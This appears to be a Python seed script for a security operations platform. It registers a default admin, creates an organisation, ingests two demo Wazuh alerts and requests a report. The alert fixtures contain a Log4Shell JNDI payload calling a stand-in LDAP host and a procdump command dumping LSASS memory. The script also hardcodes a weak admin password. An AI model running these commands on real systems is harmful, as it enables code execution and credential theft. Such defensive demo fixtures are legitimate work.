import httpx2 as httpx

client = httpx.Client(base_url="http://127.0.0.1:8000")

# 1. Register default admin
reg_res = client.post("/auth/register", json={
    "email": "admin@terminus.local",
    "password": "Password123!",
    "display_name": "Terminus Administrator",
})
print("Register status:", reg_res.status_code)

# 2. Login
login_res = client.post("/auth/login", json={
    "email": "admin@terminus.local",
    "password": "Password123!",
})
print("Login status:", login_res.status_code)
token = login_res.json()["session_token"]

# 3. Get or Create Default Org
headers = {"Authorization": f"Bearer {token}"}
orgs_res = client.get("/orgs", headers=headers)
if orgs_res.status_code == 200 and len(orgs_res.json()) > 0:
    org_id = orgs_res.json()[0]["org_id"]
    print(f"Using existing Org: {org_id}")
else:
    org_res = client.post("/orgs", headers=headers, json={"name": "Terminus Security Operations"})
    print("Create Org status:", org_res.status_code)
    org_id = org_res.json()["org_id"]
headers["X-Org-ID"] = org_id

# 4. Ingest an alert
alert = {
    "id": "wazuh-alert-demo-01",
    "rule": {
        "id": 100001,
        "level": 12,
        "description": "Log4Shell JNDI Remote Code Execution Exploit Attempt",
        "mitre": {"id": "T1190"},
    },
    "agent": {"id": "srv-prod-01", "name": "prod-frontend-gateway-01"},
    "full_log": "GET /search?q=${jndi:ldap://198.51.100.42:1389/payload} HTTP/1.1",
    "timestamp": "2026-09-05T04:00:00Z",
}
alert_res = client.post("/wazuh", headers=headers, json=alert)
print("Ingest alert status:", alert_res.status_code)

# 5. Ingest alert 2
alert2 = {
    "id": "wazuh-alert-demo-02",
    "rule": {
        "id": 100002,
        "level": 14,
        "description": "Suspicious LSASS Process Memory Dump (Credential Theft)",
        "mitre": {"id": "T1003"},
    },
    "agent": {"id": "srv-dc-01", "name": "corp-ad-domain-controller-01"},
    "full_log": "C:\\Windows\\Temp\\procdump64.exe -ma lsass.exe lsass.dmp",
    "timestamp": "2026-09-05T04:10:00Z",
}
alert2_res = client.post("/wazuh", headers=headers, json=alert2)
print("Ingest alert 2 status:", alert2_res.status_code)

# 6. Generate Quick Report
rep_res = client.post("/reports/quick", headers=headers)
print("Quick report status:", rep_res.status_code)
print("Seeding completed successfully!")
